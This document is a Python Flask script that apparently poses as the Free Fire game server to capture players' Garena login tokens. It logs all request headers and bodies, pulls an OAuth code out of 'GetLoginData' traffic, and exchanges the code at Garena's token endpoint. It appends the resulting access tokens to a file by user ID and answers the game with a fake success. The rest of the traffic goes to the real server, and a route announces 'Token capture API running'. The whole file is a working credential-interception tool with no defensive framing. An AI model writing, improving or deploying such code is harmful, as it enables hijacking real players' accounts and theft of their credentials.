from flask import Flask, request, jsonify, Response
import requests
import os
import json
import re
from datetime import datetime

app = Flask(__name__)

# ─── CONFIG ──────────────────────────────────────────────────────
REAL_SERVER = "https://client.ind.freefiremobile.com"
CLIENT_ID = "100067"
TOKEN_URL = "https://auth.garena.com/oauth/token"
REDIRECT_URI = "https://api.ff.garena.co.id/auth/auth/callback_n?site=https://api-discountstore.kiosgamer.gameid.garena.co.id/oauth/callback_redirect/"

active_users = []
# ─────────────────────────────────────────────────────────────────

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def catch_all(path):
    print(f"\n🔹 {request.method} /{path}")
    print(f"   Headers: {dict(request.headers)}")
    print(f"   Query: {request.args}")
    print(f"   Raw body (first 200): {request.get_data()[:200]}")

    # If it's a request to /user/<user_id>/... we handle it separately
    if path.startswith('user/'):
        # Parse user_id and subpath from the path
        parts = path.split('/')
        if len(parts) >= 2:
            user_id = parts[1]
            subpath = '/'.join(parts[2:]) if len(parts) > 2 else ''
            return handle_user_request(user_id, subpath)

    # For root or other paths, return a success JSON
    return jsonify({"status": "success", "message": "OK"}), 200

def handle_user_request(user_id, subpath):
    print(f"\n🔹 User: {user_id}, Subpath: {subpath}")

    if user_id not in active_users:
        active_users.append(user_id)
        print(f"👤 New user: {user_id}")

    # ── If it's GetLoginData, try to capture token ──
    if subpath == "GetLoginData":
        raw_data = request.get_data()
        print(f"📦 Received {len(raw_data)} bytes")

        # Try to find OAuth code in the data
        oauth_code = None
        code_pattern = re.compile(rb'[a-zA-Z0-9_-]{30,50}')
        matches = code_pattern.findall(raw_data)
        if matches:
            for candidate in matches:
                candidate_str = candidate.decode('utf-8', errors='ignore')
                if len(candidate_str) > 30 and not candidate_str.isdigit():
                    oauth_code = candidate_str
                    print(f"🔍 Found code: {oauth_code}")
                    break

        if oauth_code:
            # Exchange code for tokens
            payload = {
                "grant_type": "authorization_code",
                "code": oauth_code,
                "client_id": CLIENT_ID,
                "redirect_uri": REDIRECT_URI
            }
            try:
                resp = requests.post(TOKEN_URL, data=payload, timeout=10)
                token_data = resp.json()
                hex_token = token_data.get('access_token')
                if hex_token:
                    print(f"🎯 HEX TOKEN: {hex_token}")
                    with open("tokens.txt", "a") as f:
                        f.write(f"{datetime.now()} | {user_id} | {hex_token}\n")
            except Exception as e:
                print(f"❌ Exchange error: {e}")

        # ── Always return success to the game ──
        return jsonify({"status": "success", "message": "OK"}), 200

    # ── For all other requests, forward to Garena ──
    try:
        real_url = f"{REAL_SERVER}/{subpath}" if subpath else REAL_SERVER
        headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'connection']}
        headers.pop('Content-Length', None)
        headers['Host'] = 'client.ind.freefiremobile.com'

        resp = requests.request(
            method=request.method,
            url=real_url,
            headers=headers,
            data=request.get_data(),
            params=request.args,
            allow_redirects=False,
            timeout=30
        )
        excluded = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        resp_headers = [(k, v) for k, v in resp.raw.headers.items() if k.lower() not in excluded]
        return Response(resp.content, status=resp.status_code, headers=resp_headers)
    except Exception as e:
        print(f"❌ Forward error: {e}")
        return jsonify({"status": "success", "message": "OK"}), 200

@app.route('/')
def admin():
    return jsonify({
        "active_users": active_users,
        "message": "Token capture API running"
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)